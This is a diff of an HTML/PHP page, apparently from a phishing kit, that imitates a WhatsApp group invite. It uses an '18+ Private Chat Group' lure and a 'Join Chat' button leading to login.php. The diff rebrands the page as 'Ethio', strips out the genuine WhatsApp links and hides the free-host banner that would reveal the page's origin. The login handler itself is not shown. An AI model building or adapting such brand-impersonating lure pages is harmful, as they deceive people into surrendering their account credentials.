@@ -2,7 +2,7 @@
 <head>
 <style>img[alt*="www.000webhost.com"]{display:none}</style>
 <meta charset="UTF-8">
-<title>WhatsApp Group Invite</title>
+<title>Ethio Group Invite</title>
 
 <link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
 <link rel="stylesheet" href="css/v4/style.build35e635e635e6.css">
@@ -32,14 +32,13 @@
 		<div class="page-content page-content--single">
 			<div class="block block--invite">
 				<a href="#" id="action-icon" title="Follow this link to join: Berbagi Video 18+ Hot" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/1.jpg);"></span></a>
-				<h2 class="block__title">18+ Private Chat Group<h2>
-				<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
-				<button onclick="location.href='login.php';" type="button" class="button button--simple button--primary">Join Chat</button>
+				<h2 class="block__title">18+ Ethio Private Chat Group<h2>
+				<h3 class="block__subtitle" dir="auto">Ethio Group Invite</h3>
+				<button onclick="location.href='login.php';" type="button" class="button button--simple button--primary">Join Ethio Chat</button>
 			</div>
 			<hr>
 			<div class="block block--hint">
-				 Don't have WhatsApp yet?<br>
-				<a href="https://www.whatsapp.com/download">Download</a>
+				 Don't have Ethio yet?<br>
 			</div>
 		</div>
 	</div>
@@ -48,7 +47,6 @@
 		<div class="page-footer__inner">
 			<div class="four -spaced">
 				<div class="block block--footer four__item">
-					<h4 class="block__title">WhatsApppp</h4>
 					<div class="block__body">
 						<ul class="list list--footer">
 							<li class="list__item">
@@ -69,59 +67,8 @@
 						</ul>
 					</div>
 				</div>
-				<div class="block block--footer four__item">
-					<h4 class="block__title">Company</h4>
-					<div class="block__body">
-						<ul class="list list--footer">
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/about/" class="list__link">About</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/join/" class="list__link">Careers</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsappbrand.com/" class="list__link">Brand Center</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/contact/" class="list__link">Get in touch</a>
-							</li>
-							<li class="list__item">
-								<a href="https://blog.whatsapp.com/" class="list__link">Blog</a>
-							</li>
-							<li class="list__item">
-								<span class="list__empty"></span>
-							</li>
-							<li class="list__item">
-								<span class="list__empty"></span>
-							</li>
-						</ul>
-					</div>
-				</div>
-				<div class="block block--footer four__item">
-					<h4 class="block__title">Download</h4>
-					<div class="block__body">
-						<ul class="list list--footer">
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/download/" class="list__link">Mac/PC</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/android/" class="list__link">Android</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/appstore/" class="list__link">iPhone</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/wp/" class="list__link">Windows Phone</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/ota/" class="list__link">BlackBerry</a>
-							</li>
-							<li class="list__item">
-								<a href="https://www.whatsapp.com/nokia/" class="list__link">Nokia</a>
-							</li>
-						</ul>
-					</div>
-				</div>
+				
+				
 				<div class="block block--footer four__item">
 					<h4 class="block__title">Help</h4>
 					<div class="block__body">
@@ -153,7 +100,7 @@
 	<div class="page-footer -secondary">
 		<div class="page-footer__inner">
 			<div class="four">
-				<div class="four__item" dir="auto"> <?php echo date("Y"); ?>  &copy; WhatsApp Inc.</div>
+				<div class="four__item" dir="auto"> <?php echo date("Y"); ?>  &copy; Ethio Inc.</div>
 				<div class="four__item -span3">
 					<a href="https://www.ethioplayers.com/legal/" class="page-footer__link">Privacy & Terms</a>
 				</div>
